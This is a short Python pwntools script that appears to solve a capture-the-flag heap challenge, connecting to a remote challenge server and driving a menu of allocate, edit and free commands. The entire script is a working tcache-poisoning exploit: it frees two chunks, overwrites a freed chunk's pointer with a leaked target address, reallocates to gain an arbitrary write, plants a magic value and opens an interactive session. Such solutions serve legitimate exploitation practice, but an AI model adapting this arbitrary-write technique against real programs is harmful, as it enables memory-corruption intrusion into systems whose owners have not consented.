from pwn import * 
#r = process('./1st-grade')
r = remote('0.cloud.chals.io', 12549)
def malloc(i):
    r.sendline(b'1')
    r.sendline(str(i).encode())
def edit(i, content):
    r.sendline(b'2')
    r.sendline(str(i).encode())
    r.sendline(content)
def free(i):
    r.sendline(b'3')
    r.sendline(str(i).encode())

r.sendline(b'5')
r.recvuntil(b'Target location: ')
target = int(r.recvline(), 16)
malloc(0)
malloc(1)
free(0)
free(1)
edit(1, p64(target))
malloc(0)
malloc(1)
edit(1, p32(0xdeadb007))
r.sendline(b'5')
r.interactive()
